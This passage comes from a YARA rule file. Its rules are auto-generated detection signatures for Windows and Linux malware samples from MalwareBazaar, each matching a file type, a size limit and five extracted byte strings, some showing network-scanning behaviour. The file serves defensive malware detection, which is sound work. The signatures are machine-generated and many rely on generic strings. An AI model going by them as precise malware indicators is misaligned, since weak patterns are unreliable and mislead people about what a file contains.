        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "MSVBVM60.DLL"
        $s4 = "Install, Setup or Update"
        $s5 = "CoolerBar"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB
        and all of them
}

rule Linux_8526c9ec79feb6493e41d770fa6cea984641a676f9ba121fc2b8a3428ace585c
{
    meta:
        description = "Auto ML: 8526c9ec79feb6493e41d770fa6cea984641a676f9ba121fc2b8a3428ace585c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "XOTP!c"
        $s2 = "vlSOCB1"
        $s3 = "VOUwK{"
        $s4 = "<gfJ4O"
        $s5 = "'H1aAB"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 23KB
        and all of them
}

rule Windows_85346857515bcff04f4ec8aa4b906e12eff6073de9273d99113621cd30cce659
{
    meta:
        description = "Auto ML: 85346857515bcff04f4ec8aa4b906e12eff6073de9273d99113621cd30cce659"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "a 1pUfY"
        $s5 = "Y-af K"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 834KB
        and all of them
}

rule Windows_8555743631267a78de02ae65d5454e3bfc2ac6c5336dab259fcff5316aba840c
{
    meta:
        description = "Auto ML: 8555743631267a78de02ae65d5454e3bfc2ac6c5336dab259fcff5316aba840c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Linux_857ba333550532909f31ffe349202e1fed7e159eb329dbc949ea6e8cd79fcfad
{
    meta:
        description = "Auto ML: 857ba333550532909f31ffe349202e1fed7e159eb329dbc949ea6e8cd79fcfad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "x}%KxH"
        $s2 = "x}$KxH"
        $s3 = "x}d[x}%KxK"
        $s4 = "}f[x}GSxH"
        $s5 = "x}'KxH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 87KB
        and all of them
}

rule Windows_858935b8075312dbe37a7b1916d92ee6c19df3f260d0809b3a97b886297a86e3
{
    meta:
        description = "Auto ML: 858935b8075312dbe37a7b1916d92ee6c19df3f260d0809b3a97b886297a86e3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3925KB
        and all of them
}

rule Linux_0c2642d10807bba762a5a257e20f3dbbc8cbb31ea1d784112e9f4a77f4acbde0
{
    meta:
        description = "Auto ML: 0c2642d10807bba762a5a257e20f3dbbc8cbb31ea1d784112e9f4a77f4acbde0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "OHWHQHy"
        $s3 = "BAHA ."
        $s4 = "N^NuNuNV"
        $s5 = "@N^NuNV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 116KB
        and all of them
}

rule Windows_85e7587a2013104dae85c32865728f1176a555502c4c594faf7ebf68ae2773f1
{
    meta:
        description = "Auto ML: 85e7587a2013104dae85c32865728f1176a555502c4c594faf7ebf68ae2773f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "QQSVWh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 205KB
        and all of them
}

rule Windows_85fa3bba1c836ac87b3bede3666032cf869ac536095b22cd661ad930f631bb87
{
    meta:
        description = "Auto ML: 85fa3bba1c836ac87b3bede3666032cf869ac536095b22cd661ad930f631bb87"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1726KB
        and all of them
}

rule Windows_860ea5b26b4297ef791f2bf7be670c89f5771a2384974c8fd1de9c862ecc338e
{
    meta:
        description = "Auto ML: 860ea5b26b4297ef791f2bf7be670c89f5771a2384974c8fd1de9c862ecc338e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".dowuyoh"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 211KB
        and all of them
}

rule Windows_861f5ebaad65712e0c699fe6fad2f63cca3f35759ed92f44db0d6d089889d209
{
    meta:
        description = "Auto ML: 861f5ebaad65712e0c699fe6fad2f63cca3f35759ed92f44db0d6d089889d209"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Nullable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 575KB
        and all of them
}

rule Linux_863e02d47d369a12c5d6129300e98df3c493a163f42477fab6498f9ce003f31a
{
    meta:
        description = "Auto ML: 863e02d47d369a12c5d6129300e98df3c493a163f42477fab6498f9ce003f31a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = ".bI76-IV"
        $s3 = "Sv:pcK"
        $s4 = "bwG:o*"
        $s5 = "*uB_tF`"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 24KB
        and all of them
}

rule Windows_8640e6333193359bb71c47135ffdd3011eaf882c3987a7c6d54490d15b537486
{
    meta:
        description = "Auto ML: 8640e6333193359bb71c47135ffdd3011eaf882c3987a7c6d54490d15b537486"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2419KB
        and all of them
}

rule Windows_864535296e9af54c499f6c263b0e892c0c21194b4e3b9ec4f2e1514004d5b147
{
    meta:
        description = "Auto ML: 864535296e9af54c499f6c263b0e892c0c21194b4e3b9ec4f2e1514004d5b147"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1992KB
        and all of them
}

rule Windows_8647351f3a2882d4d6c37d3d41e4c42b1bdc80d61f9f7572e262f7e7381b9144
{
    meta:
        description = "Auto ML: 8647351f3a2882d4d6c37d3d41e4c42b1bdc80d61f9f7572e262f7e7381b9144"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB
        and all of them
}

rule Linux_8649f64e8a9ffe0dc1e203412f4a409078e856f39a896353057925eed7457e89
{
    meta:
        description = "Auto ML: 8649f64e8a9ffe0dc1e203412f4a409078e856f39a896353057925eed7457e89"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "T`X(}iJx|c"
        $s2 = "|iJxTc"
        $s3 = "+xUIX(T"
        $s4 = "KxTi@.|"
        $s5 = "}#Kx}e[x8"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 55KB
        and all of them
}

rule Windows_8655d011d45616085cb2ec5d7cb594757b66e6ac7e3fe9b11d09dfb410884e07
{
    meta:
        description = "Auto ML: 8655d011d45616085cb2ec5d7cb594757b66e6ac7e3fe9b11d09dfb410884e07"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Windows_0c482a3a2510cf8f323c5c4d9097850be9e77f09cf163b1de2c2220cfad3beb8
{
    meta:
        description = "Auto ML: 0c482a3a2510cf8f323c5c4d9097850be9e77f09cf163b1de2c2220cfad3beb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.managed"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5400KB
        and all of them
}

rule Windows_86f1a75b8dd44fc6982db418c457e07caaebcb6c426d2953439b79cc8b16e180
{
    meta:
        description = "Auto ML: 86f1a75b8dd44fc6982db418c457e07caaebcb6c426d2953439b79cc8b16e180"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "-T\"c}Pm"
        $s3 = "YtqaZ7"
        $s4 = "E`YtqV"
        $s5 = "G3tq(Y{"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 136KB
        and all of them
}

rule Windows_8704970ac644f9c7eec883f809720177ff9992fe745607329d2e68f82c0c11b1
{
    meta:
        description = "Auto ML: 8704970ac644f9c7eec883f809720177ff9992fe745607329d2e68f82c0c11b1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "graphs_and_percentages_for_calculations"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3681KB
        and all of them
}

rule Linux_8704eb337ed465539d3446057dde253f9f24bcf8646a35e934df21b76a236e1d
{
    meta:
        description = "Auto ML: 8704eb337ed465539d3446057dde253f9f24bcf8646a35e934df21b76a236e1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Hc3rGT"
        $s2 = "Cgb%h0"
        $s3 = "J?mv-b"
        $s4 = "qP`IBV"
        $s5 = "A/xSSY"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 32KB
        and all of them
}

rule Windows_870765abf32cfe3a2f7c47fbe4c8ec968a97676935ae0c062437c98d88215d98
{
    meta:
        description = "Auto ML: 870765abf32cfe3a2f7c47fbe4c8ec968a97676935ae0c062437c98d88215d98"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2418KB
        and all of them
}

rule Windows_873546478ec547e4e82af18fa5004c67794141d9cb98e79a4ff84c86a6c6aeb8
{
    meta:
        description = "Auto ML: 873546478ec547e4e82af18fa5004c67794141d9cb98e79a4ff84c86a6c6aeb8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "PADPADP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 551KB
        and all of them
}

rule Windows_87545d25bd7ba1490287b40c178d3b75765457565caa7d27a801d8a2e21d5fd3
{
    meta:
        description = "Auto ML: 87545d25bd7ba1490287b40c178d3b75765457565caa7d27a801d8a2e21d5fd3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6344KB
        and all of them
}

rule Windows_8769e71a46cb1b735e48564e99dc77427323ae40e7dc5eff43dd00444e041354
{
    meta:
        description = "Auto ML: 8769e71a46cb1b735e48564e99dc77427323ae40e7dc5eff43dd00444e041354"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "R,Q~b6^GONk"
        $s3 = ",XGHOA"
        $s4 = "VWX6Cr"
        $s5 = "-lG/he"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5787KB
        and all of them
}

rule Windows_879652c40641501a93a824425a88b116ad4d8fe81ed937a1ef7794ac64b0dfa4
{
    meta:
        description = "Auto ML: 879652c40641501a93a824425a88b116ad4d8fe81ed937a1ef7794ac64b0dfa4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@.gfids"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 35438KB
        and all of them
}

rule Windows_87a11f0978c920e56e599a311e1dcab9fc287bf194de9622100cd44cb5c600de
{
    meta:
        description = "Auto ML: 87a11f0978c920e56e599a311e1dcab9fc287bf194de9622100cd44cb5c600de"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "OY gO7"
        $s4 = "#Strings"
        $s5 = "Framework"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 578KB
        and all of them
}

rule Windows_87b8b2a322467b783909e0fdad2d1745159377950eb1f8fb2a53e5bb00cb7fd5
{
    meta:
        description = "Auto ML: 87b8b2a322467b783909e0fdad2d1745159377950eb1f8fb2a53e5bb00cb7fd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6885KB
        and all of them
}

rule Windows_0c77140267d3698f825ef41a02a49a8593bd5df4db00c1bdbe0fcc15bfee3df5
{
    meta:
        description = "Auto ML: 0c77140267d3698f825ef41a02a49a8593bd5df4db00c1bdbe0fcc15bfee3df5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "FGQ2:l}kGMc/"
        $s3 = "wDUVeQ"
        $s4 = "ye!Hsxs"
        $s5 = "tg>[hn"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB
        and all of them
}

rule Windows_87dc843c26db143ec9d2869ee4be3e53593fa7b4331a0ceb170f6e2339caa304
{
    meta:
        description = "Auto ML: 87dc843c26db143ec9d2869ee4be3e53593fa7b4331a0ceb170f6e2339caa304"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "j5P'.T>t.T>t.T>t0"
        $s3 = "Et-T>t.T?txT>t0"
        $s4 = "t/T>tRich.T>t"
        $s5 = "`.rdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 209KB
        and all of them
}

rule Linux_880a57b45cb30cebd23b796fde0dd57259f5988c540dca1e196be0f6776a6db2
{
    meta:
        description = "Auto ML: 880a57b45cb30cebd23b796fde0dd57259f5988c540dca1e196be0f6776a6db2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wsX2c7_"
        $s2 = "?Gx$2dB"
        $s3 = "F=K,k#v;\\%;K`"
        $s4 = "]+lukd"
        $s5 = "x'Qw4w"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB
        and all of them
}

rule Windows_880e3f283194f01bd82af5fc16eca910e6e0b64b30fb46c0f642fe36b095478e
{
    meta:
        description = "Auto ML: 880e3f283194f01bd82af5fc16eca910e6e0b64b30fb46c0f642fe36b095478e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6208KB
        and all of them
}

rule Windows_883006e791321cb9dff98bf1be3f1ef40bcb3a21ebf668bd75554f89331256ef
{
    meta:
        description = "Auto ML: 883006e791321cb9dff98bf1be3f1ef40bcb3a21ebf668bd75554f89331256ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "AM )UU"
        $s5 = "Xee Vg"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1070KB
        and all of them
}

rule Windows_8836e9f5373e2030728938432ad14b81076cf5205cd6d862d9fc9d1452ff584b
{
    meta:
        description = "Auto ML: 8836e9f5373e2030728938432ad14b81076cf5205cd6d862d9fc9d1452ff584b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "PQQQQQ"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1603KB
        and all of them
}

rule Windows_885e71a79cae7e2ce156cf2dd4c166538a0b2bf02a5d170a9d13ded41748113d
{
    meta:
        description = "Auto ML: 885e71a79cae7e2ce156cf2dd4c166538a0b2bf02a5d170a9d13ded41748113d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "jXh@?B"
        $s5 = "0SSSSS"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 180KB
        and all of them
}

rule Linux_88b383081c46232d2a0c46cf8c35b84ac92417eeae25a386f1de3dc2d8336269
{
    meta:
        description = "Auto ML: 88b383081c46232d2a0c46cf8c35b84ac92417eeae25a386f1de3dc2d8336269"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 176KB
        and all of them
}

rule Linux_88dc309153f65bd0644c4b91d1141bcfaea7d4e9a0d8069807686e1a1f362433
{
    meta:
        description = "Auto ML: 88dc309153f65bd0644c4b91d1141bcfaea7d4e9a0d8069807686e1a1f362433"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HcD$TH"
        $s2 = "HcD$0H"
        $s3 = "HcD$TA"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "HcD$dH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB
        and all of them
}

rule Windows_88f0722c907100ef09049c82032a0ac66afa153d03fb89d378ae65f6e5890a3f
{
    meta:
        description = "Auto ML: 88f0722c907100ef09049c82032a0ac66afa153d03fb89d378ae65f6e5890a3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".gfids"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 486KB
        and all of them
}

rule Windows_88f244f1882d4be11fb49e7a367cd93d57f2bed658f573b4d51a277822d17840
{
    meta:
        description = "Auto ML: 88f244f1882d4be11fb49e7a367cd93d57f2bed658f573b4d51a277822d17840"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3295KB
        and all of them
}

rule Windows_0c7829f63c451c0af41284aa465a7f560775acd9e228b789a047b80ebd7f4b3d
{
    meta:
        description = "Auto ML: 0c7829f63c451c0af41284aa465a7f560775acd9e228b789a047b80ebd7f4b3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0SSSSS"
        $s5 = "Y;=xKB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Linux_8903c6adb88d2a77ed5442ffa3ca3f7a712ec864b260a09a36994211214d1a7c
{
    meta:
        description = "Auto ML: 8903c6adb88d2a77ed5442ffa3ca3f7a712ec864b260a09a36994211214d1a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$JPPj"
        $s2 = "D$$PWV"
        $s3 = "T$(;|$(tlPPj"
        $s4 = "9|$$tBPPj"
        $s5 = "T$`VVj"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB
        and all of them
}

rule Linux_8958c12355079917a62570de09ae003681e66150a8e4aaa24427735a31cb530e
{
    meta:
        description = "Auto ML: 8958c12355079917a62570de09ae003681e66150a8e4aaa24427735a31cb530e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/2Obf5E6"
        $s2 = "zN)7Fv"
        $s3 = "mx@ApN"
        $s4 = "Uu;TN\\"
        $s5 = "y w!ZHw"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB
        and all of them
}

rule Windows_8960100ed18988a177edb0c6825ebe9319cc350c344ce7ce40df4a9d50c44e6f
{
    meta:
        description = "Auto ML: 8960100ed18988a177edb0c6825ebe9319cc350c344ce7ce40df4a9d50c44e6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".gafub"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 228KB
        and all of them
}

rule Windows_897b63dc56623c54120c95340a7e8c416786dbc18bb03dae3300ab2fd57e928a
{
    meta:
        description = "Auto ML: 897b63dc56623c54120c95340a7e8c416786dbc18bb03dae3300ab2fd57e928a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "%N\"UUU@XV S"
        $s5 = "c UUUUj_"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6617KB
        and all of them
}

rule Windows_8a020aab0287b59502a256c75272770048fab37c5625fd81128cbb699d5d4559
{
    meta:
        description = "Auto ML: 8a020aab0287b59502a256c75272770048fab37c5625fd81128cbb699d5d4559"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "SVWuH3"
        $s5 = "PQh\\6B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB
        and all of them
}

rule Windows_8a153debc69f1d51f36df5763d50971a0f6b0ff6d88012abfc619a9633cc2818
{
    meta:
        description = "Auto ML: 8a153debc69f1d51f36df5763d50971a0f6b0ff6d88012abfc619a9633cc2818"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1209KB
        and all of them
}

rule Windows_8a52d87aa80812e9d072f7f197f320f8a7d253ddc1a6070b014cb35189d3fddd
{
    meta:
        description = "Auto ML: 8a52d87aa80812e9d072f7f197f320f8a7d253ddc1a6070b014cb35189d3fddd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "B@UUUUUU"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1071KB
        and all of them
}

rule Windows_8a6478be6724353a423b6246ebbd3e586c908832c0a5715050935d421d7d4512
{
    meta:
        description = "Auto ML: 8a6478be6724353a423b6246ebbd3e586c908832c0a5715050935d421d7d4512"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "7lqZ8rktd"
        $s5 = "wXo55i5\"aq9dgPlgmypqDT33/0=Mvh7oqZ8vktdgzsP"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1148KB
        and all of them
}

rule Windows_8a6587bf245cd55599ac872ba8299b6631dca6171c0b637ff85ac47a3649d064
{
    meta:
        description = "Auto ML: 8a6587bf245cd55599ac872ba8299b6631dca6171c0b637ff85ac47a3649d064"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "S>tRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".yeniki"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 253KB
        and all of them
}

rule Windows_8aa65358ef1e12582637acfac6035208e5d62fc9d39e715194d26c81502f0e2d
{
    meta:
        description = "Auto ML: 8aa65358ef1e12582637acfac6035208e5d62fc9d39e715194d26c81502f0e2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
